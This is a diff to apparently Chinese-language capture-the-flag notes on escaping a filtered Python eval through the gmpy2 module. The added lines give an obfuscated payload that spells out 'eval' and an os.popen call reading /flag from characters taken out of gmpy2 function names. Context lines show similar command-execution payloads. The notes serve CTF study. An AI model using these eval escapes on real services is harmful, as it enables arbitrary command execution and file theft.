@@ -22,10 +22,15 @@ eval(__import__('os').popen('cat /f*').read());
 ^
 ## **eval存在过滤**
 eval(code)
-要求code存在gmpy2数组中，且正则不能存在eval
+要求code存在gmpy2数组中
 ```
-知道以下可以命令执行：
+知道gmpy2以下可以命令执行：
 gmpy2.__builtins__['eval']("__import__('os').popen('tac /flag').read()")
+
+则需要对eval和__import__('os').popen('tac /flag').read()进行内含的数组中绕过
+即：
+gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cot'[2]+'ai'[0]+'cmp'[0]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
+
 ```
 
 
